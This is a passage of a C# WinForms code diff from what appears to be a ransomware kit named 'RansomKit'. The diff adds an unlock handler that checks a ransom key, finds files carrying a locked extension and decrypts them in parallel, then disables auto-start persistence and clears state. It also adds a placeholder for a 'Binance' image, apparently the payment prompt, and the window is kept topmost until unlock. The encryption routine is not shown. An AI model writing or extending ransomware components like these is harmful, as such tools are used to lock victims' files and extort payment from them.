+            var size = g.MeasureString(text, font);
+            g.DrawString(text, font, brush,
+                (bmp.Width - size.Width) / 2f,
+                (bmp.Height - size.Height) / 2f);
+            return bmp;
         }
 
-        private void Log(string msg)
+        private static Bitmap BuildBinanceErrorPlaceholder()
         {
-            if (InvokeRequired) { Invoke(new Action(() => Log(msg))); return; }
-            _log.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
-            _log.ScrollToCaret();
+            var bmp = new Bitmap(460, 180);
+            using var g = Graphics.FromImage(bmp);
+            using var pen = new Pen(Color.FromArgb(120, 40, 40));
+            using var font = new Font("Segoe UI", 10f);
+            using var brush = new SolidBrush(Color.FromArgb(220, 80, 80));
+
+            g.Clear(Color.FromArgb(14, 14, 18));
+            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
+            const string text = "binance image found but could not be loaded\n(re-save as standard JPEG or PNG)";
+            var size = g.MeasureString(text, font);
+            g.DrawString(text, font, brush,
+                (bmp.Width - size.Width) / 2f,
+                (bmp.Height - size.Height) / 2f);
+            return bmp;
         }
 
-        private void Log(string msg, Color c)
+        // =========================================================
+        //  DECRYPT — parallel, session-key cached
+        // =========================================================
+        private async void UnlockButton_Click(object? sender, EventArgs e)
         {
-            if (InvokeRequired) { Invoke(new Action(() => Log(msg, c))); return; }
-            _log.SelectionStart = _log.TextLength;
-            _log.SelectionLength = 0;
-            _log.SelectionColor = c;
-            _log.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
-            _log.SelectionColor = _log.ForeColor;
-            _log.ScrollToCaret();
+            string key = _keyBox.Text ?? string.Empty;
+            if (!CryptoEngine.VerifyPassword(key))
+            {
+                _statusLabel.Text = "Invalid key.";
+                _statusLabel.ForeColor = Color.FromArgb(220, 80, 80);
+                return;
+            }
+
+            var state = StateManager.Load();
+            var files = state?.Files ?? new List<string>();
+            var paths = state?.Paths ?? Persistence.LoadPaths();
+
+            if (files.Count == 0 && paths.Count > 0)
+            {
+                files = Walker.Walk(paths)
+                    .Where(f => f.EndsWith(CryptoEngine.LockedExtension,
+                                           StringComparison.OrdinalIgnoreCase))
+                    .ToList();
+            }
+
+            _unlockButton.Enabled = false;
+            _statusLabel.ForeColor = Color.FromArgb(150, 150, 165);
+            _statusLabel.Text = "Decrypting...";
+
+            int total = files.Count;
+            int done = 0, failed = 0;
+            int cores = Environment.ProcessorCount;
+
+            await Task.Run(() =>
+            {
+                Parallel.ForEach(
+                    files,
+                    new ParallelOptions { MaxDegreeOfParallelism = cores },
+                    f =>
+                    {
+                        string target = f.EndsWith(CryptoEngine.LockedExtension,
+                                                   StringComparison.OrdinalIgnoreCase)
+                            ? f
+                            : f + CryptoEngine.LockedExtension;
+
+                        if (!File.Exists(target))
+                        {
+                            Interlocked.Increment(ref failed);
+                            return;
+                        }
+
+                        try
+                        {
+                            CryptoEngine.DecryptFile(target);
+                            int current = Interlocked.Increment(ref done);
+
+                            if (current % 25 == 0 || current == total)
+                            {
+                                try
+                                {
+                                    _statusLabel.BeginInvoke((Action)(() =>
+                                        _statusLabel.Text = $"Decrypting {current}/{total}..."));
+                                }
+                                catch { }
+                            }
+                        }
+                        catch { Interlocked.Increment(ref failed); }
+                    });
+            });
+
+            CryptoEngine.ResetSessionKey();
+
+            StateManager.Clear();
+            Persistence.DisableAutoStart();
+            Persistence.SetLocked(false);
+            Persistence.ClearPaths();
+
+            TopMost = false;
+            _statusLabel.ForeColor = Color.Gainsboro;
+            _statusLabel.Text = $"Decrypted {done} files. ({failed} missing/failed)";
+            MessageBox.Show(this, $"Done.\nDecrypted: {done}\nSkipped: {failed}",
+                "RansomKit", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+            Close();
         }
     }
 }
